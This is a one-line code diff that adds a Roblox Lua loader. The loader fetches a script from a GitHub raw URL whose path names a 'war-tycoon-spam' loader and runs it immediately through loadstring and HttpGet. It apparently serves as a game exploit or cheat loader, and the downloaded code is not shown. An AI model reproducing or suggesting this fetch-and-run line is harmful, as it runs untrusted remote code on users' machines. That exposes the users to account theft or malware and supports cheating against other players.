@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/codefinchpalace/loaders/main/loaders/kf-41-war-tycoon-spam3-s89athb9jrqdan.lua"))()
